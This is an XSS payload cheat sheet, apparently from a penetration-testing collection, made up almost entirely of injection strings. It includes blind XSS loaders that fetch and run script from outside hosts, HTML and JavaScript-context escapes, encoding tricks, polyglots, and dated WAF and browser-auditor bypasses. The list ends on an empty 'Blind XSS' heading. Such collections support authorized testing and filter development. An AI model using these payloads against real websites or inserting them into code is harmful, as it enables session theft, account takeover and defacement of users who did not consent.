
# Blind XSS Payloads

```
<script src=//payloader.appspot.com/bxs.js>
"><script src=////payloader.appspot.com/bxs.js>
'><script src=//payloader.appspot.com/bxs.js>
"><script src=//payloader.appspot.com/bxs.js></script>
'><script src=//payloader.appspot.com/bxs.js></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'https://payloader.appspot.com/bxs.js\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//payloader.appspot.com/bxs.ks");a.send();</script>
<script>$.getScript("//payloader.appspot.com/bxs.js")</script>
><script>$.getScript("//payloader.appspot.com/bxs.js")</script>
'><script>$.getScript("//payloader.appspot.com/bxs.js")</script>
"><script>$.getScript("//payloader.appspot.com/bxs.js")</script>
```

# Basic HTML Injection/Escape
```
<script>alert('XSS')</script>
<scr<script>ipt>alert('XSS')</scr<script>ipt>
"><script>alert('XSS')</script>
"><script>alert(String.fromCharCode(88,83,83))</script>
<script>alert(1)//
<script>alert(1)<!–
<script src=//brutelogic.com.br/1.js>

*/</script>'>alert(1)/*<script/1='
"autofocus/onfocus=alert(1)//
"onmouseover=alert(1)//
<object onafterscriptexecute=confirm(0)>
<object onbeforescriptexecute=confirm(0)>
<img src=x onerror=alert('XSS');>
<img src=x onerror=alert(String.fromCharCode(88,83,83));>
<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
<img src=x:alert(alt) onerror=eval(src) alt=xss>

<script src=javascript:alert(1)>
<iframe src=javascript:alert(1)>
<embed src=javascript:alert(1)>
<a href=javascript:alert(1)>click
<math><brute href=javascript:alert(1)>click
<form action=javascript:alert(1)><input type=submit>
<isindex action=javascript:alert(1) type=submit value=click>
<object data=javascript:alert(1)>

'onload=alert(1)><svg/1='
<img src="/" =_=" title="onerror='prompt(1)'">
<%<!--'%><script>alert(1);</script -->
<script src="data:text/javascript,alert(1)"></script>
<iframe/src \/\/onload = prompt(1)
<iframe/onreadystatechange=alert(1)
<svg/onload=alert(1)
<input value=<><iframe/src=javascript:confirm(1)
<input type="text" value=``<div/onmouseover='alert(1)'>X</div>
```

## XSS URL

```
URL/<svg onload=alert(1)>
URL/<script>alert('XSS');//
URL/<input autofocus onfocus=alert(1)>
```

## XSS with javascript:

```
javascript:prompt(1)
\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)
\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003aalert(1)
\152\141\166\141\163\143\162\151\160\164\072alert(1)

// We can use a 'newline character'
java%0ascript:alert(1)   - LF (\n)
java%09script:alert(1)   - Horizontal tab (\t)
java%0dscript:alert(1)   - CR (\r)

// Using the escape character
\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)

// Using the newline and a comment //
javascript://%0Aalert(1)
javascript://anything%0D%0A%0D%0Awindow.alert(1)
```

## XSS with data

```
data:text/html,<script>alert(0)</script>
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```

# DOM XSS

```
#"><img src=/ onerror=alert(2)>
```

# HTML Tags

```
<body onload=alert(1)>
<body onpageshow=alert(1)>
<body onfocus=alert(1)>
<body onhashchange=alert(1)><a href=#x>click this!#x
<body style=overflow:auto;height:1000px onscroll=alert(1) id=x>#x
<body onscroll=alert(1)><br><br><br><br>
<body onresize=alert(1)>press F12!
<body onhelp=alert(1)>press F1! (MSIE)
<marquee onstart=alert(1)>
<marquee loop=1 width=0 onfinish=alert(1)>
<audio src onloadstart=alert(1)>
<video onloadstart=alert(1)><source>
<input autofocus onblur=alert(1)>
<keygen autofocus onfocus=alert(1)>
<form onsubmit=alert(1)><input type=submit>
```

# Polyglots

```
'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http://i.imgur.com/P8mL8.jpg">
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
 ">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg">
" onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>
javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*
```

# SVG Variations
```
<svgonload=alert(1)>
<svg/onload=alert('XSS')>
<svg/onload=alert(String.fromCharCode(88,83,83))>
<svg id=alert(1) onload=eval(id)>
"><svg/onload=alert(String.fromCharCode(88,83,83))>
"><svg/onload=alert(/XSS/)
```

# JS Context

```
alert`1`
alert&lpar;1&rpar;
alert&#x28;1&#x29
alert&#40;1&#41
(alert)(1)
a=alert,a(1)
[1].find(alert)
top["al"+"ert"](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
top['al\145rt'](1)
top['al\x65rt'](1)
top[8680439..toString(30)](1)
navigator.vibrate(500)
eval(URL.slice(-8))>#alert(1)
eval(location.hash.slice(1)>#alert(1)
innerHTML=location.hash>#<script>alert(1)</script>
```

# Email

```javascript
"><svg/onload=confirm(1)>"@x.y
```

# Exotics and Bypasses

```
<</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script>
<</script/script><script ~~~>\u0061lert(1)</script ~~~>
</style></scRipt><scRipt>alert(1)</scRipt>
<img/id="alert&lpar;&#x27;XSS&#x27;&#x29;\"/alt=\"/\"src=\"/\"onerror=eval(id&#x29;>
<img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
```

```
<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
<script>$=1,alert($)</script>
<script ~~~>confirm(1)</script ~~~>
<script>$=1,\u0061lert($)</script>
<</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script>
<</script/script><script ~~~>\u0061lert(1)</script ~~~>
</style></scRipt><scRipt>alert(1)</scRipt>
<img/id="alert&lpar;&#x27;XSS&#x27;&#x29;\"/alt=\"/\"src=\"/\"onerror=eval(id&#x29;>
<img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
<svg><x><script>alert&#40;&#39;1&#39;&#41</x>
<iframe src=""/srcdoc='&lt;svg onload&equals;alert&lpar;1&rpar;&gt;'>
```

## Bypass using UTF-7

```
+ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-
```

## Common WAF Bypass

### Cloudflare XSS Bypass - 22nd march 2019 (by @RakeshMane10)

```
<svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
```

### Cloudflare XSS Bypass - 27th february 2018

```
<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>
```

### Chrome Auditor - 9th august 2018

```
</script><svg><script>alert(1)-%26apos%3B
```

# Blind XSS